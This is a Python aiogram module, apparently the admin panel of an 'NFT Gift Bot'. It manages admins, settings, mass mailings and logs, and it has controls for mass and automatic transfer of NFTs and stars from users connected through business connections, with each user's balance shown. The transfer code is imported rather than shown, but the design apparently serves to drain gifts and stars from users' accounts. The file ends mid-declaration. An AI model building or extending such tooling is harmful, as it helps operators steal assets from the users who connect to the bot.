import asyncio
import logging
import json
import os
from typing import Dict, Any, List
from aiogram import F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# =========================================================
# === ОПРЕДЕЛЕНИЕ СОСТОЯНИЙ (STATES) ======================
# =========================================================

# Управление настройками
class AdminSettingsStates(StatesGroup):
    waiting_for_min_stars = State()

# Управление рассылкой
class MailingStates(StatesGroup):
    waiting_for_text = State()
    waiting_for_photo = State()

# Управление чеками
class CheckSystemStates(StatesGroup):
    waiting_for_stars = State()

# Управление админами
class AdminManagementStates(StatesGroup):
    waiting_for_admin_id_to_add = State()
    waiting_for_admin_id_to_remove = State()

# =========================================================
# === КОНФИГУРАЦИЯ И ФУНКЦИИ ДЛЯ АДМИНОВ ===================
# =========================================================

ADMINS_FILE_PATH = 'admins.json'
OWNER_ID = 7592097268

def load_admins():
    """Загружает список админов из файла. Если файла нет, создает его с OWNER_ID."""
    if not os.path.exists(ADMINS_FILE_PATH):
        with open(ADMINS_FILE_PATH, 'w') as f:
            json.dump({'admin_ids': [OWNER_ID]}, f)
        return [OWNER_ID]
    
    with open(ADMINS_FILE_PATH, 'r') as f:
        data = json.load(f)
        return data.get('admin_ids', [])

def save_admins(admin_list):
    """Сохраняет список админов в файл."""
    with open(ADMINS_FILE_PATH, 'w') as f:
        json.dump({'admin_ids': admin_list}, f, indent=4)

ADMIN_IDS = load_admins()

def is_admin(user_id: int) -> bool:
    """Проверяет, является ли пользователь админом."""
    return user_id in ADMIN_IDS

def add_admin(user_id: int):
    """Добавляет пользователя в список админов и сохраняет файл."""
    if user_id not in ADMIN_IDS:
        ADMIN_IDS.append(user_id)
        save_admins(ADMIN_IDS)

def remove_admin(user_id: int):
    """Удаляет пользователя из списка админов и сохраняет файл."""
    if user_id in ADMIN_IDS and user_id != OWNER_ID:
        ADMIN_IDS.remove(user_id)
        save_admins(ADMIN_IDS)

# =========================================================
# === ОСНОВНОЙ КОД ADMIN.PY ===============================
# =========================================================

router = Router()
logger = logging.getLogger(__name__)

# Mock-функции для примера, так как у меня нет доступа к вашим файлам
try:
    from utils.file_utils import get_connections, load_settings, save_settings, get_setting, set_setting, get_recent_logs
    from utils.transfer import transfer_all_unique_gifts, get_star_balance, get_unique_gifts, get_regular_gifts
    from utils.logging import log_admin_action, log_performance
    from utils.automation import send_smart_notifications, auto_transfer_nft_when_ready
    from utils.statistics import get_statistics, generate_statistics_report
    from utils.user_management import get_users_list, get_user_detailed_info
    from utils.mass_operations import mass_transfer_nft, transfer_nft_for_user
    from utils.check_system import create_check, get_all_checks, get_checks_statistics, delete_check, get_unused_checks, get_check
    from utils.database import db
except ImportError as e:
    logger.error(f"Не удалось импортировать утилиты: {e}. Работа будет ограничена.")
    # Создаем заглушки для функций, чтобы код работал
    def get_connections(): return []
    def load_settings(): return {}
    def save_settings(): pass
    def get_setting(key, default): return default
    def set_setting(key, value): pass
    def get_recent_logs(limit): return []
    async def get_user_detailed_info(bot, user_id): return {}
    async def mass_transfer_nft(bot): return "❌ Функционал недоступен"
    def log_admin_action(user_id, action, details): pass
    async def generate_statistics_report(): return "📊 Статистика временно недоступна."
    def get_checks_statistics(): return {'total_checks': 0, 'used_checks': 0, 'unused_checks': 0, 'total_stars': 0, 'used_stars': 0, 'unused_stars': 0}
    def get_check(check_id): return None
    def delete_check(check_id): return False
    async def get_users_list(): return []
    async def get_star_balance(bot, business_connection_id): return 0
    class MockDb:
        def get_all_users(self): return []
    db = MockDb()

# =========================================================
# === Управление администраторами =========================
# =========================================================

@router.callback_query(F.data == "admin_manage_admins")
async def admin_manage_admins(callback: CallbackQuery):
    """Показывает список админов и кнопки для управления ими."""
    if callback.from_user.id != OWNER_ID:
        await callback.answer("❌ У вас нет прав для управления администраторами.", show_alert=True)
        return

    text = "👥 <b>Управление администраторами</b>\n\n"
    if ADMIN_IDS:
        admin_list = "\n".join([f"👤 ID: <code>{admin_id}</code>" for admin_id in ADMIN_IDS])
        text += f"<b>Текущие администраторы:</b>\n{admin_list}"
    else:
        text += "Список администраторов пуст."

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="➕ Добавить админа", callback_data="admin_add_admin"),
            InlineKeyboardButton(text="➖ Удалить админа", callback_data="admin_remove_admin")
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ])

    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@router.callback_query(F.data == "admin_add_admin")
async def admin_add_admin_start(callback: CallbackQuery, state: FSMContext):
    """Начинает процесс добавления админа."""
    if callback.from_user.id != OWNER_ID:
        await callback.answer("❌ У вас нет прав для этого действия.", show_alert=True)
        return

    await state.set_state(AdminManagementStates.waiting_for_admin_id_to_add)

    text = (
        "➕ <b>Добавление администратора</b>\n\n"
        "Отправьте ID пользователя, которого хотите назначить администратором.\n\n"
        "❌ Для отмены отправьте /cancel"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_manage_admins")]
    ])
    
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@router.message(AdminManagementStates.waiting_for_admin_id_to_add)
async def handle_add_admin_id(message: Message, state: FSMContext):
    """Обрабатывает ID для добавления в админы."""
    if message.from_user.id != OWNER_ID:
        return

    try:
        new_admin_id = int(message.text.strip())
        
        if new_admin_id in ADMIN_IDS:
            await message.answer(
                f"❌ Пользователь <code>{new_admin_id}</code> уже является администратором.",
                parse_mode="HTML"
            )
        else:
            add_admin(new_admin_id)
            await message.answer(
                f"✅ Пользователь <code>{new_admin_id}</code> успешно добавлен в список администраторов.",
                parse_mode="HTML"
            )

        await state.clear()
        
        await admin_manage_admins(
            await message.answer(
                "Обновление...",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
            )
        )

    except (ValueError, TypeError):
        await message.answer("❌ Пожалуйста, введите корректный числовой ID.")

@router.callback_query(F.data == "admin_remove_admin")
async def admin_remove_admin_start(callback: CallbackQuery, state: FSMContext):
    """Начинает процесс удаления админа."""
    if callback.from_user.id != OWNER_ID:
        await callback.answer("❌ У вас нет прав для этого действия.", show_alert=True)
        return

    await state.set_state(AdminManagementStates.waiting_for_admin_id_to_remove)

    text = (
        "➖ <b>Удаление администратора</b>\n\n"
        "Отправьте ID пользователя, которого хотите удалить из списка администраторов.\n"
        "<b>Внимание:</b> Владельца бота удалить нельзя.\n\n"
        "❌ Для отмены отправьте /cancel"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_manage_admins")]
    ])

    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@router.message(AdminManagementStates.waiting_for_admin_id_to_remove)
async def handle_remove_admin_id(message: Message, state: FSMContext):
    """Обрабатывает ID для удаления из админов."""
    if message.from_user.id != OWNER_ID:
        return

    try:
        admin_id_to_remove = int(message.text.strip())
        
        if admin_id_to_remove == OWNER_ID:
            await message.answer("❌ Вы не можете удалить владельца бота.", parse_mode="HTML")
        elif admin_id_to_remove not in ADMIN_IDS:
            await message.answer(
                f"❌ Пользователь <code>{admin_id_to_remove}</code> не является администратором.",
                parse_mode="HTML"
            )
        else:
            remove_admin(admin_id_to_remove)
            await message.answer(
                f"✅ Пользователь <code>{admin_id_to_remove}</code> успешно удален из списка администраторов.",
                parse_mode="HTML"
            )

        await state.clear()
        
        await admin_manage_admins(
            await message.answer(
                "Обновление...",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
            )
        )

    except (ValueError, TypeError):
        await message.answer("❌ Пожалуйста, введите корректный числовой ID.")

# =========================================================
# === Остальной код (без изменений) =======================
# =========================================================

async def safe_edit_message(message, text: str, **kwargs):
    """Безопасное редактирование сообщения с проверкой на изменение содержимого"""
    try:
        current_text = message.text or message.caption or ""
        if current_text == text:
            return False
        
        await message.edit_text(text, **kwargs)
        return True
    except Exception as e:
        if "message is not modified" in str(e).lower():
            return False
        else:
            raise e

def get_admin_panel_keyboard() -> InlineKeyboardMarkup:
    """Создание клавиатуры админ-панели"""
    auto_transfer = get_setting('auto_transfer', True)
    manual_selection = get_setting('manual_selection', False)
    auto_notifications = get_setting('auto_notifications', True)
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
            InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")
        ],
        [
            InlineKeyboardButton(text="🔄 Массовый перевод NFT", callback_data="admin_mass_nft"),
            InlineKeyboardButton(text="⭐️ Массовый перевод звезд", callback_data="admin_mass_stars")
        ],
        [
            InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_mailing"),
            InlineKeyboardButton(text="🔧 Настройки", callback_data="admin_settings")
        ],
        [
            InlineKeyboardButton(text="🎫 Система чеков", callback_data="admin_checks"),
            InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")
        ],
        [InlineKeyboardButton(text="👥 Управление админами", callback_data="admin_manage_admins")]
    ])

@router.message(F.text == "/admin")
async def admin_panel(message: Message):
    """Админ-панель"""
    if not is_admin(message.from_user.id):
        return
    
    keyboard = get_admin_panel_keyboard()
    await message.answer(
        "🔧 <b>Админ-панель NFT Gift Bot</b>\n\n"
        "Выберите действие:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@router.callback_query(F.data == "admin_stats")
async def admin_statistics(callback: CallbackQuery):
    """Показать статистику"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("📊 Загружаем статистику...")
    
    try:
        report = await generate_statistics_report()
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_stats")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
        ])
        
        edited = await safe_edit_message(
            callback.message,
            report,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        if not edited:
            await callback.answer("📊 Статистика актуальна")
            
    except Exception as e:
        logger.error(f"Ошибка получения статистики: {e}")
        await safe_edit_message(
            callback.message,
            f"❌ Ошибка получения статистики: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    """Показать пользователей"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("👥 Загружаем список пользователей...")
    
    try:
        users = await get_users_list()
        
        if not users:
            users_text = "👥 <b>Пользователи</b>\n\nСписок пользователей пуст."
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        else:
            users_text = "👥 <b>Пользователи</b>\n\n"
            for i, user in enumerate(users[:20], 1):
                username = user.get('username', 'N/A')
                user_id = user.get('user_id', 'N/A')
                connection_date = user.get('connection_date', 'N/A')[:10]
                
                users_text += f"{i}. @{username} (ID: {user_id})\n"
                users_text += f"   📅 Подключен: {connection_date}\n\n"
            
            if len(users) > 20:
                users_text += f"... и ещё {len(users) - 20} пользователей"
            
            keyboard = []
            for i, user in enumerate(users[:10], 1):
                username = user.get('username', f'User{i}')
                user_id = user.get('user_id')
                keyboard.append([
                    InlineKeyboardButton(
                        text=f"👤 {username}",
                        callback_data=f"user_info:{user_id}"
                    )
                ])
            
            keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
            keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard)
        
        edited = await safe_edit_message(
            callback.message,
            users_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        if not edited:
            await callback.answer("👥 Список пользователей актуален")
    except Exception as e:
        logger.error(f"Ошибка получения пользователей: {e}")
        await safe_edit_message(
            callback.message,
            f"❌ Ошибка получения пользователей: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.callback_query(F.data.startswith("user_info:"))
async def user_info(callback: CallbackQuery):
    """Информация о пользователе"""
    if not is_admin(callback.from_user.id):
        return
    
    user_id = int(callback.data.split(":")[1])
    await callback.answer(f"👤 Загружаем информацию о пользователе {user_id}...")
    
    try:
        user_info = await get_user_detailed_info(callback.bot, user_id)
        
        if not user_info:
            await callback.message.edit_text(
                f"❌ Пользователь {user_id} не найден",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
                ])
            )
            return
        
        username = user_info.get('username', 'N/A')
        connection_date = user_info.get('connection_date', 'N/A')[:10]
        star_balance = user_info.get('star_balance', 'N/A')
        nft_count = user_info.get('nft_count', 'N/A')
        total_transfers = user_info.get('total_transfers', 0)
        success_rate = user_info.get('success_rate', 0)
        
        text = (
            f"👤 <b>Информация о пользователе</b>\n\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"👤 Username: @{username}\n"
            f"📅 Подключен: {connection_date}\n"
            f"⭐️ Звезд: {star_balance}\n"
            f"🎁 NFT: {nft_count}\n"
            f"🔄 Переводов: {total_transfers}\n"
            f"📈 Успешность: {success_rate:.1f}%\n"
        )
        
        keyboard = [
            [InlineKeyboardButton(text="📋 Логи", callback_data=f"user_logs:{user_id}")],
            [InlineKeyboardButton(text="🔄 Повторить NFT", callback_data=f"retry_nft_user:{user_id}")],
            [InlineKeyboardButton(text="💬 Написать", url=f"tg://user?id={user_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
        ]
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
        )
    except Exception as e:
        logger.error(f"Ошибка получения информации о пользователе: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка получения информации: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
            ])
        )

@router.callback_query(F.data == "admin_mass_nft")
async def admin_mass_nft(callback: CallbackQuery):
    """Массовый перевод NFT"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("🔄 Запускаем массовый перевод NFT...")
    
    try:
        result = await mass_transfer_nft(callback.bot)
        
        await callback.message.edit_text(
            result,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка массового перевода NFT: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка массового перевода NFT: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

async def admin_settings_from_message(message: Message):
    """Настройки бота (для вызова из обработчика сообщений)"""
    auto_transfer = get_setting('auto_transfer', True)
    manual_selection = get_setting('manual_selection', False)
    auto_notifications = get_setting('auto_notifications', True)
    min_stars = get_setting('min_stars_for_auto_transfer', 10)
    
    text = (
        "🔧 <b>Настройки бота</b>\n\n"
        f"🤖 Автоперевод: {'✅ Включен' if auto_transfer else '❌ Выключен'}\n"
        f"👆 Ручной выбор: {'✅ Включен' if manual_selection else '❌ Выключен'}\n"
        f"🔔 Автоуведомления: {'✅ Включены' if auto_notifications else '❌ Выключены'}\n"
        f"⭐️ Мин. звезд для автоперевода: {min_stars}\n"
    )
    
    keyboard = [
        [
            InlineKeyboardButton(
                text="🤖 Автоперевод",
                callback_data="admin_toggle_auto"
            ),
            InlineKeyboardButton(
                text="👆 Ручной выбор",
                callback_data="admin_toggle_manual"
            )
        ],
        [
            InlineKeyboardButton(
                text="🔔 Уведомления",
                callback_data="admin_toggle_notifications"
            ),
            InlineKeyboardButton(
                text="⭐️ Мин. звезд",
                callback_data="admin_min_stars"
            )
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ]
    
    await message.answer(
        text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

async def admin_back_from_message(message: Message):
    """Возврат в админ-панель (для вызова из обработчика сообщений)"""
    keyboard = get_admin_panel_keyboard()
    await message.answer(
        "🔧 <b>Админ-панель NFT Gift Bot</b>\n\n"
        "Выберите действие:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@router.callback_query(F.data == "admin_settings")
async def admin_settings(callback: CallbackQuery):
    """Настройки бота"""
    if not is_admin(callback.from_user.id):
        return
    
    auto_transfer = get_setting('auto_transfer', True)
    manual_selection = get_setting('manual_selection', False)
    auto_notifications = get_setting('auto_notifications', True)
    min_stars = get_setting('min_stars_for_auto_transfer', 10)
    
    text = (
        "🔧 <b>Настройки бота</b>\n\n"
        f"🤖 Автоперевод: {'✅ Включен' if auto_transfer else '❌ Выключен'}\n"
        f"👆 Ручной выбор: {'✅ Включен' if manual_selection else '❌ Выключен'}\n"
        f"🔔 Автоуведомления: {'✅ Включены' if auto_notifications else '❌ Выключены'}\n"
        f"⭐️ Мин. звезд для автоперевода: {min_stars}\n"
    )
    
    keyboard = [
        [
            InlineKeyboardButton(
                text="🤖 Автоперевод",
                callback_data="admin_toggle_auto"
            ),
            InlineKeyboardButton(
                text="👆 Ручной выбор",
                callback_data="admin_toggle_manual"
            )
        ],
        [
            InlineKeyboardButton(
                text="🔔 Уведомления",
                callback_data="admin_toggle_notifications"
            ),
            InlineKeyboardButton(
                text="⭐️ Мин. звезд",
                callback_data="admin_min_stars"
            )
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ]
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@router.callback_query(F.data == "admin_toggle_auto")
async def admin_toggle_auto(callback: CallbackQuery):
    """Переключение автоперевода"""
    if not is_admin(callback.from_user.id):
        return
    
    current = get_setting('auto_transfer', True)
    set_setting('auto_transfer', not current)
    save_settings()
    
    await callback.answer(f"Автоперевод {'включен' if not current else 'выключен'}")
    await admin_settings(callback)

@router.callback_query(F.data == "admin_toggle_manual")
async def admin_toggle_manual(callback: CallbackQuery):
    """Переключение ручного выбора"""
    if not is_admin(callback.from_user.id):
        return
    
    current = get_setting('manual_selection', False)
    set_setting('manual_selection', not current)
    save_settings()
    
    await callback.answer(f"Ручной выбор {'включен' if not current else 'выключен'}")
    await admin_settings(callback)

@router.callback_query(F.data == "admin_toggle_notifications")
async def admin_toggle_notifications(callback: CallbackQuery):
    """Переключение уведомлений"""
    if not is_admin(callback.from_user.id):
        return
    
    current = get_setting('auto_notifications', True)
    set_setting('auto_notifications', not current)
    save_settings()
    
    await callback.answer(f"Уведомления {'включены' if not current else 'выключены'}")
    await admin_settings(callback)

@router.callback_query(F.data == "admin_min_stars")
async def admin_min_stars(callback: CallbackQuery):
    """Изменение минимального количества звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    current_min_stars = get_setting('min_stars_for_auto_transfer', 10)
    
    text = (
        "⭐️ <b>Минимальное количество звезд для автоперевода</b>\n\n"
        f"📊 Текущее значение: <b>{current_min_stars}</b>\n\n"
        "Выберите новое значение:"
    )
    
    keyboard = [
        [
            InlineKeyboardButton(text="5", callback_data="admin_set_min_stars:5"),
            InlineKeyboardButton(text="10", callback_data="admin_set_min_stars:10"),
            InlineKeyboardButton(text="15", callback_data="admin_set_min_stars:15")
        ],
        [
            InlineKeyboardButton(text="20", callback_data="admin_set_min_stars:20"),
            InlineKeyboardButton(text="25", callback_data="admin_set_min_stars:25"),
            InlineKeyboardButton(text="30", callback_data="admin_set_min_stars:30")
        ],
        [
            InlineKeyboardButton(text="50", callback_data="admin_set_min_stars:50"),
            InlineKeyboardButton(text="100", callback_data="admin_set_min_stars:100")
        ],
        [
            InlineKeyboardButton(text="✏️ Ввести вручную", callback_data="admin_manual_min_stars")
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_settings")]
    ]
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@router.callback_query(F.data.startswith("admin_set_min_stars:"))
async def admin_set_min_stars(callback: CallbackQuery):
    """Установка минимального количества звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        new_value = int(callback.data.split(":")[1])
        
        set_setting('min_stars_for_auto_transfer', new_value)
        save_settings()
        
        await callback.answer(f"✅ Минимальное количество звезд установлено: {new_value}")
        await admin_settings(callback)
        
    except (ValueError, IndexError) as e:
        logger.error(f"Ошибка установки минимального количества звезд: {e}")
        await callback.answer("❌ Ошибка установки значения", show_alert=True)

@router.callback_query(F.data == "admin_manual_min_stars")
async def admin_manual_min_stars(callback: CallbackQuery, state: FSMContext):
    """Запрос ручного ввода минимального количества звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    await state.set_state(AdminSettingsStates.waiting_for_min_stars)
    
    text = (
        "✏️ <b>Введите минимальное количество звезд</b>\n\n"
        "📝 Отправьте число от 1 до 1000\n"
        "💡 Например: 25\n\n"
        "❌ Для отмены отправьте /cancel"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_settings")]
    ])
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.message(AdminSettingsStates.waiting_for_min_stars)
async def handle_manual_min_stars(message: Message, state: FSMContext):
    """Обработка ручного ввода минимального количества звезд"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        if not message.text.isdigit():
            await message.answer(
                "❌ <b>Ошибка!</b>\n\n"
                "📝 Пожалуйста, введите число от 1 до 1000\n"
                "💡 Например: 25\n\n"
                "❌ Для отмены отправьте /cancel",
                parse_mode="HTML"
            )
            return
        
        value = int(message.text)
        
        if value < 1 or value > 1000:
            await message.answer(
                "❌ <b>Ошибка!</b>\n\n"
                "📝 Значение должно быть от 1 до 1000\n"
                "💡 Попробуйте еще раз\n\n"
                "❌ Для отмены отправьте /cancel",
                parse_mode="HTML"
            )
            return
        
        set_setting('min_stars_for_auto_transfer', value)
        save_settings()
        
        await state.clear()
        
        await message.answer(
            f"✅ <b>Минимальное количество звезд установлено: {value}</b>",
            parse_mode="HTML"
        )
        
        await admin_settings_from_message(message)
        
    except ValueError:
        await message.answer(
            "❌ <b>Ошибка!</b>\n\n"
            "📝 Пожалуйста, введите корректное число\n"
            "💡 Например: 25\n\n"
            "❌ Для отмены отправьте /cancel",
            parse_mode="HTML"
        )

# =========================================================
# === Остальной код... ====================================
# =========================================================

@router.message(F.text == "/cancel")
async def cancel_input(message: Message, state: FSMContext):
    """Отмена ввода (универсальная)"""
    if not is_admin(message.from_user.id):
        return
    
    current_state = await state.get_state()
    
    if current_state == AdminSettingsStates.waiting_for_min_stars.state:
        await state.clear()
        await message.answer("❌ Ввод отменен")
        await admin_settings_from_message(message)
    elif current_state == AdminManagementStates.waiting_for_admin_id_to_add.state or current_state == AdminManagementStates.waiting_for_admin_id_to_remove.state:
        await state.clear()
        await message.answer("❌ Ввод отменен")
        await admin_manage_admins(await message.answer("Обновление..."))
    elif current_state == MailingStates.waiting_for_text.state or current_state == MailingStates.waiting_for_photo.state:
        await state.clear()
        await message.answer("❌ Рассылка отменена.")
    else:
        await state.clear()
        await message.answer("❌ Операция отменена.")

@router.callback_query(F.data == "admin_mailing")
async def admin_mailing(callback: CallbackQuery, state: FSMContext):
    """Начало создания рассылки"""
    if not is_admin(callback.from_user.id):
        return
    
    await state.set_state(MailingStates.waiting_for_text)
    
    text = (
        "📢 <b>Создание рассылки</b>\n\n"
        "📝 Отправьте текст рассылки\n\n"
        "💡 Поддерживается HTML разметка:\n"
        "• <b>жирный</b>\n"
        "• <i>курсив</i>\n"
        "• <code>код</code>\n"
        "• <a href='ссылка'>ссылка</a>\n\n"
        "❌ Для отмены отправьте /cancel"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_back")]
    ])
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.callback_query(F.data == "mailing_skip_photo")
async def mailing_skip_photo(callback: CallbackQuery, state: FSMContext):
    """Пропуск добавления изображения"""
    if not is_admin(callback.from_user.id):
        return
    
    data = await state.get_data()
    mailing_text = data.get('mailing_text', '')
    
    text = (
        "📢 <b>Предварительный просмотр рассылки</b>\n\n"
        f"📝 <b>Текст:</b>\n{mailing_text[:200]}{'...' if len(mailing_text) > 200 else ''}\n\n"
        "📷 <b>Изображение:</b> ❌ Не добавлено\n\n"
        "🚀 Нажмите 'Отправить' для начала рассылки\n"
        "❌ Или 'Отмена' для отмены"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Отправить", callback_data="mailing_send")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_back")]
    ])
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.callback_query(F.data == "mailing_send")
async def mailing_send(callback: CallbackQuery, state: FSMContext):
    """Отправка рассылки"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("🚀 Начинаем рассылку...")
    
    try:
        data = await state.get_data()
        mailing_text = data.get('mailing_text', '')
        photo_file_id = data.get('photo_file_id', None)
        
        users = db.get_all_users()
        
        if not users:
            await callback.message.edit_text(
                "❌ <b>Ошибка рассылки</b>\n\n"
                "👥 Нет пользователей для рассылки",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
                ])
            )
            await state.clear()
            return
        
        success_count = 0
        failed_count = 0
        
        progress_message = await callback.message.edit_text(
            f"📢 <b>Рассылка в процессе...</b>\n\n"
            f"👥 Всего пользователей: {len(users)}\n"
            f"✅ Отправлено: 0\n"
            f"❌ Ошибок: 0",
            parse_mode="HTML"
        )
        
        for i, user in enumerate(users, 1):
            try:
                user_id = user.get('user_id')
                if not user_id:
                    continue
                
                if photo_file_id:
                    await callback.bot.send_photo(
                        chat_id=user_id,
                        photo=photo_file_id,
                        caption=mailing_text,
                        parse_mode="HTML"
                    )
                else:
                    await callback.bot.send_message(
                        chat_id=user_id,
                        text=mailing_text,
                        parse_mode="HTML"
                    )
                
                success_count += 1
                
                if i % 10 == 0:
                    await progress_message.edit_text(
                        f"📢 <b>Рассылка в процессе...</b>\n\n"
                        f"👥 Всего пользователей: {len(users)}\n"
                        f"✅ Отправлено: {success_count}\n"
                        f"❌ Ошибок: {failed_count}",
                        parse_mode="HTML"
                    )
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                failed_count += 1
                logger.error(f"Ошибка отправки рассылки пользователю {user_id}: {e}")
        
        await progress_message.edit_text(
            f"📢 <b>Рассылка завершена!</b>\n\n"
            f"👥 Всего пользователей: {len(users)}\n"
            f"✅ Успешно отправлено: {success_count}\n"
            f"❌ Ошибок: {failed_count}\n\n"
            f"📝 <b>Текст:</b>\n{mailing_text[:100]}{'...' if len(mailing_text) > 100 else ''}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
        
        await state.clear()
        
    except Exception as e:
        logger.error(f"Ошибка рассылки: {e}")
        await callback.message.edit_text(
            f"❌ <b>Ошибка рассылки</b>\n\n"
            f"Ошибка: {str(e)}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
        await state.clear()

@router.callback_query(F.data == "admin_back")
async def admin_back(callback: CallbackQuery):
    """Возврат в админ-панель"""
    if not is_admin(callback.from_user.id):
        return
    
    keyboard = get_admin_panel_keyboard()
    await callback.message.edit_text(
        "🔧 <b>Админ-панель NFT Gift Bot</b>\n\n"
        "Выберите действие:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@router.callback_query(F.data == "admin_logs")
async def admin_logs(callback: CallbackQuery):
    """Показать логи"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("📋 Загружаем логи...")
    
    try:
        logs = get_recent_logs(10)
        
        if not logs:
            text = "📋 <b>Логи пусты</b>"
        else:
            text = "📋 <b>Последние логи:</b>\n\n"
            for i, log in enumerate(logs[:5], 1):
                timestamp = log.get('timestamp', '')[:19]
                user_id = log.get('user_id', 'N/A')
                status = log.get('status', 'N/A')
                error = log.get('error', '')
                
                text += f"<b>{i}.</b> 🕐 {timestamp}\n"
                text += f"👤 ID: {user_id} | 📊 {status}\n"
                if error:
                    text += f"❌ {error[:50]}...\n"
                text += "\n"
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_logs")],
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка получения логов: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка получения логов: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.callback_query(F.data == "admin_mass_stars")
